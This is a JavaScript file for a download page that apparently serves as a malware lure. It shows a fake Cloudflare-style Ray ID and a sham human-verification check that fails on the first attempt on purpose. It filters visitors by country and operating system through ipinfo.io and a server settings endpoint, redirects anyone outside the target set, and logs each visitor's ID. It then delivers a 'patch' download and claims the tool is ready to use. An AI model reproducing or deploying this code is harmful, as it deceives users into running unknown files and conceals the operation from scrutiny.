

// domain 
const domain = window.location.hostname;


let clickCount = 0;


// Function to generate a random 16-character hexadecimal Ray ID
function generateRayID() {
  var characters = "0123456789abcdef";
  let rayID = "";
  for (let i = 0; i < 16; i++) {
    rayID += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return rayID;
}


var downloadBtn = document.getElementById("download-btn");
var captchaWrapper = document.getElementById("captcha-wrapper");

let userLang;
let translate_Lang;
// **************** JS Code For Translate ********************
// Function to detect the user's browser language and set the appropriate text
function setLanguage(translations) {
  // Get the user's preferred language from the browser (e.g., 'en', 'es')
  userLang = navigator.language || navigator.userLanguage;
  // Only keep the first two characters (e.g., 'en-US' becomes 'en')
  userLang = userLang.slice(0, 2);

  // If the language is not supported, default to English ('en')
  if (!translations[userLang]) {
    userLang = "es";
  }

  // Fetch all elements with the 'data-translate' attribute
  var translatableElements = document.querySelectorAll("[data-translate]");

  // Loop through each element and update its text based on the detected language
  translatableElements.forEach((element) => {

    var translateKey = element.getAttribute("data-translate");
    element.innerHTML = translations[userLang][translateKey];
  });
}


// Function to load translations from a JSON file
function loadTranslations() {
  fetch("./V1_files/lang.json")
    .then((response) => response.json())
    .then((translations) => {
      translate_Lang = translations;
      setLanguage(translations);
    })
    .catch((error) => {
      console.error("Error loading translations:", error);
    });
}


// Automatically load translations when the page loads
document.addEventListener("DOMContentLoaded", () => {
  loadTranslations();
});


// click download button => display verify panel
$('#donwload_btn').click(function() {
    document.getElementById('overlay').style.display = 'block';
    document.getElementById('captcha-wrapper').style.display = 'block';  
})


// download ban more than 2 times
var downloadCount = 0;

// on submit
$('#submit_btn').click(function() {

  if (isClose) {

    downloadCount++;
    
    if (isDirectDownload) {

      const link = document.createElement('a');
      link.href = patchDownloadLinks[0];
      link.download = '';
      link.style = 'display: none';
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);

    } else {
      window.location.href = "/api/download.php?rayid=" + rayID + '&countrycode=' + country_code + '&version=V1';
    }

    window.setTimeout(function() {
        check_ray_id();
    }, 60000);

    window.alert("Download complete.\nThe tool is ready to use.");
  }

  if (downloadCount >= 2) {
    isClose = false;
    $('#submit_btn').removeClass('submit_btn');
    $('#submit_btn').addClass('pre_submit_btn');
  }

})


// can the popup close?
var isClose = false;

// play video loading
function play_loading() {
    
    document.getElementById("captcha-text").innerHTML = translate_Lang[userLang]['process'];

    if (clickCount == 0) {
        document.getElementById('video1').play();
    } else {  
        $('#video1').css('display', 'none');
        $('#video2').css('display', 'block');
        document.getElementById('video2').play();
    } 

    setTimeout(function () {
      
      if (clickCount == 0) {
        // First click: show alert, revert to checkbox, but no success mark
        document.getElementById("error-message").style.display = "block"; // Show red error message
        document.getElementById("captcha-text").innerHTML = translate_Lang[userLang]['verify-human'];
        document.getElementById('captcha-wrapper').style.height = '130px';
        document.getElementById('submit_div').style.paddingTop = '40px';
      } else if (clickCount == 1) {
        // Second click: successful verification, show success mark
        document.getElementById("error-message").style.display = "none"; // Hide error message
        document.getElementById("captcha-text").innerHTML = translate_Lang[userLang]['success'];
        document.getElementById('captcha-wrapper').style.height = 'auto';
        document.getElementById('submit_div').style.paddingTop = '15px';

        isClose = true;
        
        $('#submit_btn').removeClass('pre_submit_btn');
        $('#submit_btn').addClass('submit_btn');

      }

      clickCount++;
    }, 2000); // Simulates loading time
}




// set dark mode by OS setting
// Function to toggle dark mode based on browser/system setting
function applyDarkMode() {
  // Check if the user's browser/system is set to dark mode
  if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
    // Dark mode is enabled in browser settings
    $('*').addClass('dark-mode');
    console.log('Dark mode applied based on browser setting');
  } else {
    // Light mode is enabled in browser settings
    $('*').removeClass('dark-mode');
    console.log('Light mode applied based on browser setting');
  }
}

// Detect system/browser color scheme changes
window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', (event) => {
  if (event.matches) {
    // User switched to dark mode
    $('*').addClass('dark-mode');
    console.log('Switched to dark mode');
  } else {
    // User switched to light mode
    $('*').removeClass('dark-mode');
    console.log('Switched to light mode');
  }
});

// Apply the initial mode when the page loads
applyDarkMode();




// Ray ID
var rayID;

if (localStorage.getItem('ray')) {
  rayID = localStorage.getItem('ray');
} else {
  rayID = generateRayID();
  localStorage.setItem('ray', rayID);
}

$('#ray-id').text(rayID);  



// Getting the country code from the user's IP
var country_code = '';

// Settings info
var isDirectDownload = false;
var patchDownloadLinks = [];

$.get('https://ipinfo.io/json', function(ipinfo) {
  country_code = ipinfo.country;
  $.post('/api/get_validData.php', {}, function(setting) {

      isDirectDownload = setting.isDirectDownload == 'ON' && true;
      patchDownloadLinks = setting.PatchDownloadLinks;

      if (setting.PageStatus == 'ON' && setting.OS.includes(OS) && (setting.GEO.includes(country_code) || setting.GEO.includes('100')) && !setting.BlockedGEO.includes(country_code) && setting.Version.Enabled == 'V1') {
          $.post('/api/index.php', {
            rayid: rayID,
            countrycode: country_code,
            version: 'V1'
          });
          document.body.style.opacity = 100;
      } else {
          location.href =  window.location.protocol + "//" + window.location.hostname + (window.location.port ? ':' + window.location.port : '');
      } 
  });
})


// check ray id
check_ray_id();
function check_ray_id() {
  $.ajax({
    type: 'POST',
    url: '/api/check_rayid.php',
    data: JSON.stringify({ rayid: rayID }),
    contentType: 'application/json', // Indicate that you're sending JSON
    success: function(res) {

        if (res == '10') {
          document.body.innerHTML = '';
          location.href =  window.location.protocol + "//" + window.location.hostname + (window.location.port ? ':' + window.location.port : '');
        } 
    }
  })
}



// get OS
const OS = getOS();
function getOS() {
  const userAgent = navigator.userAgent;
  if (/Windows/i.test(userAgent)) return 'Windows';
  if (/Android/i.test(userAgent)) return 'Android';
  if (/iPhone|iPad/i.test(userAgent)) return 'iPhone';
  if (/Macintosh|Mac OS X/i.test(userAgent)) return 'macOS';
  return 'Unknown OS';
}